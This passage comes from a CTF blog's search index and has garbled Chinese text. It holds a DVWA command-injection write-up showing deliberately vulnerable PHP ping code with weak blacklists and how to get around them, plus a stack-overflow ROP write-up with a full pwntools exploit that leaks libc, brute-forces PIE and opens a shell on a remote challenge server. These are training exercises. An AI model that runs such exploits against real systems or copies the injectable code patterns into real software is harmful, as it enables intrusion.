class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure><p>å¢åŠ äº†ä¸€ä¸ªæ“ä½œï¼Œè¿‡æ»¤äº†&amp;&amp; å’Œ ;æ“ä½œç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ | å’Œ &amp;</p><p><img src="./dvwa-command-injection/command-injection_middle1.png" alt="img"></p><p><img src="./dvwa-command-injection/command-injection_middle2.png" alt="img"></p><p>ç”±äºè¿‡æ»¤å¹¶ä¸å®Œå…¨ï¼Œå¯¼è‡´å­˜åœ¨æ¼ç½‘ä¹‹é±¼ã€‚</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure><p>å®Œå–„äº†é»‘åå•ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªé—®é¢˜</p><p><img src="./dvwa-command-injection/command-injection_high1.png" alt="img"></p><p>ç”±äºä»£ç å†™çš„æ˜¯ <code>| </code> è€Œä¸æ˜¯ <code>|</code> æ‰€ä»¥ä¸åŠ ç©ºæ ¼å°±å¯ä»¥ç»•è¿‡</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€é“å¼€äº†pieçš„ROPé¢˜</title>
      <link href="/pie-rop.html"/>
      <url>/pie-rop.html</url>
      
        <content type="html"><![CDATA[<p>mainå‡½æ•°çš„ROPä»¥åŠå¼€å¯pie</p><a id="more"></a><h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><h3 id="mainå‡½æ•°"><a href="#mainå‡½æ•°" class="headerlink" title="mainå‡½æ•°"></a>mainå‡½æ•°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  read_n(&amp;s, 0x100uLL);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure><h3 id="read-n"><a href="#read-n" class="headerlink" title="read_n"></a>read_n</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">void *__fastcall read_n(void *a1, unsigned __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; &#x2F;&#x2F; eax</span><br><span class="line">  char s[520]; &#x2F;&#x2F; [rsp+10h] [rbp-210h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+218h] [rbp-8h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+21Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  if ( a2 &gt; 0x200 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;too long!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;s[v6], 1uLL);</span><br><span class="line">    if ( s[v6] &#x3D;&#x3D; 10 )</span><br><span class="line">      break;</span><br><span class="line">    if ( !s[v6] )</span><br><span class="line">      break;</span><br><span class="line">    v2 &#x3D; v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( a2 &gt; v2 );</span><br><span class="line">  if ( s[v6] &#x3D;&#x3D; 10 &amp;&amp; a2 &gt; v6 )</span><br><span class="line">    s[v6] &#x3D; 0;</span><br><span class="line">  v5 &#x3D; strlen(s);</span><br><span class="line">  return memcpy(a1, s, v5);</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹æ˜¯mainå‡½æ•°å­˜åœ¨æ ˆæº¢å‡º</p><p>ä½†æ˜¯mainå‡½æ•°ç»“æŸä¹‹åçš„è¿”å›åœ°å€æ˜¯ <code>__libc_start_main+231</code></p><img src="./pie-rop/main_ret.jpg" alt="main_ret" style="zoom:25%;" /><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>è§‚å¯Ÿåˆ°<code>ret+0x20</code>çš„åœ°æ–¹æ˜¯mainå‡½æ•°çš„å…¥å£åœ°å€ï¼Œæ‰€ä»¥åªè¦è®©å‡½æ•°åœ¨retçš„æ—¶å€™ï¼Œretåˆ°<code>__libc_start_main</code>é™„è¿‘çš„ <code>pop pop pop ret</code> å°±å¯ä»¥è¿”å›åˆ°mainå‡½æ•°</p><p>äºæ­¤åŒæ—¶ï¼Œä¹‹å‰çš„putså‡½æ•°ä¼šæ³„æ¼libcçš„åœ°å€</p><p>ç”±äºå¼€äº†pieï¼Œå¯¼è‡´ç¨‹åºçš„åŸºå€ä¸ç¡®å®šï¼Œä½†æ˜¯æœ€åçš„12ä½æ˜¯ç¡®å®šçš„ï¼Œæœ‰4ä½ä¸ç¡®å®šï¼Œéœ€è¦çˆ†ç ´ã€‚æœ‰1/16çš„æ¦‚ç‡æˆåŠŸã€‚ æ‰¾ä¸€ä¸ªåˆé€‚çš„pppråœ°å€</p><img src="./pie-rop/ropgadget.png" alt="ropgadget" style="zoom:25%;" /><p>è¿”å›åˆ°mainä¹‹åå°±æ˜¯åŸºç¡€çš„ropäº†</p><img src="./pie-rop/getshell.png" alt="getshell" style="zoom:25%;" /><h2 id="å®Œæ•´çš„exp"><a href="#å®Œæ•´çš„exp" class="headerlink" title="å®Œæ•´çš„exp"></a>å®Œæ•´çš„exp</h2><p>æœ¬æ¥æƒ³ç”¨<code>system(&quot;/bin/sh&quot;);</code>çš„ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œå› ä¸ºread_nå‡½æ•°ä¼šåœ¨è¯»å–åˆ°\x00çš„æ—¶å€™æˆªæ–­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; 0</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def dbg(command &#x3D; &quot;&quot;):</span><br><span class="line">    global sh</span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    input()</span><br><span class="line"></span><br><span class="line">def leakBase():</span><br><span class="line">    global sh</span><br><span class="line">    #sh &#x3D; process(&quot;.&#x2F;easypwn&quot;, env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;&#125;)</span><br><span class="line">    sh &#x3D; remote(&quot;nc.eonew.cn&quot;,&quot;10004&quot;)</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x88 + &#39;\x51&#39; + &#39;\x13&#39;</span><br><span class="line">    #dbg(&quot;codebase&quot;)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    c &#x3D; sh.recvline()[-7:-1].ljust(8, &#39;\x00&#39;)</span><br><span class="line">    addr &#x3D; u64(c) - 0x0000000000021351</span><br><span class="line">    print(&quot;libc &#x3D;&#x3D;&gt; &quot; + hex(addr))</span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    try:</span><br><span class="line">        base &#x3D; leakBase()</span><br><span class="line">        pop_rdi &#x3D; 0x000000000002155f + base</span><br><span class="line">        libc &#x3D; ELF(&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;)</span><br><span class="line">        system &#x3D; base + 0x4f322</span><br><span class="line">        sleep(0.3)</span><br><span class="line">        print(&quot;system &#x3D;&#x3D;&gt; &quot; + hex(system))</span><br><span class="line">        payload &#x3D; &#39;a&#39; * 0x88 + p64(system)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        sh.sendline(&quot;ls&quot;)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> ROP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå‡äº¤äº’å¼shell</title>
      <link href="/upgrade_shell.html"/>
      <url>/upgrade_shell.html</url>
      
        <content type="html"><![CDATA[<h1 id="äº¤äº’å¼shell"><a href="#äº¤äº’å¼shell" class="headerlink" title="äº¤äº’å¼shell"></a>äº¤äº’å¼shell</h1><p><a href="https://www.sohu.com/a/161766202_709042">https://www.sohu.com/a/161766202_709042</a></p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‹é“¾</title>
      <link href="/py.html"/>
      <url>/py.html</url>
      
        <content type="html"><![CDATA[<p>æ„Ÿè°¢å„ä½å¸ˆå‚…æä¾›çš„å„ç§å¸®åŠ©</p><a id="more"></a><ul><li><p>  <a href="https://last-las.github.io/">LAS</a></p></li><li><p><a href="https://550532788.github.io/">Cxlover</a></p></li><li><p>  <a href="https://0xdktb.top/">0xDktb</a></p></li><li><p>  <a href="https://xzlang.github.io/">0xDkpdd/XZLang</a></p></li><li><p>  <a href="http://timelooper.wang">time looper</a></p></li><li><p>  <a href="https://daddyhonggg.github.io">DDVH</a></p></li><li><p>  <a href="http://139.155.83.108/">Dreamstalker</a></p></li><li><p>  <a href="http://118.25.0.135">Abyss</a></p></li><li><p>  <a href="https://treebacker.github.io">treebacker</a></p></li><li><p>  <a href="http://www.pwn4fun.com/pwn">Railgun</a></p></li><li><p>  <a href="http://binlep.top/">BinLep</a></p></li><li><p>  <a href="https://blog.csdn.net/weixin_44864859">æ£‚æ˜Ÿ</a></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
